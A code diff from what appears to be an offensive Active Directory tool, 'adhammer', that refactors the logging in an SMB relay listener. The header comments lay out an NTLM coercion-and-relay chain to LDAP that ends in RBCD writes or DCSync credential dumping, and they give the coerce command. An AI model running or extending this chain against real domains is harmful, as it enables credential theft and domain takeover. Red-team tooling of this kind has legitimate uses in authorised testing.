@@ -20,6 +20,7 @@
 //! 2. In another terminal / process: `adhammer attack coerce --host <victim> --listener <listener-ip>`
 //! 3. Coerced NTLMSSP arrives → relayed to LDAP → post-auth `write-rbcd` or `dcsync`.
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 use std::time::Duration;
@@ -55,10 +56,10 @@ pub(crate) async fn relay_listen(a: RelayListenArgs) -> Result<()> {
     let listener = TcpListener::bind(&addr)
         .await
         .with_context(|| format!("bind {addr}"))?;
-    eprintln!(
-        "[*] SMB relay listener on {addr} (target={})",
+    ui::info(&format!(
+        "SMB relay listener on {addr} (target={})",
         a.relay_target.as_deref().unwrap_or("<none>")
-    );
+    ));
 
     let deadline = if a.duration == 0 {
         None
@@ -85,12 +86,12 @@ pub(crate) async fn relay_listen(a: RelayListenArgs) -> Result<()> {
         let (mut stream, peer) = match accepted {
             Ok(v) => v,
             Err(e) => {
-                eprintln!("[!] accept error: {e}");
+                ui::warn(&format!("accept error: {e}"));
                 break;
             }
         };
         connections += 1;
-        eprintln!("[+] connection from {peer}");
+        ui::ok(&format!("connection from {peer}"));
         // Read the first inbound frame (SMB2 header + NetBIOS session header
         // if present). This is what a coerced peer sends first.
         let mut buf = [0u8; 4096];
@@ -126,9 +127,9 @@ pub(crate) async fn relay_listen(a: RelayListenArgs) -> Result<()> {
         }
     }
 
-    eprintln!(
-        "[+] listener closed — {connections} connection(s) · {bytes_captured} bytes captured"
-    );
+    ui::ok(&format!(
+        "listener closed — {connections} connection(s) · {bytes_captured} bytes captured"
+    ));
 
     eprintln!(
         "[hint] this step is a known adhammer gap: the SMB→LDAP forward path \
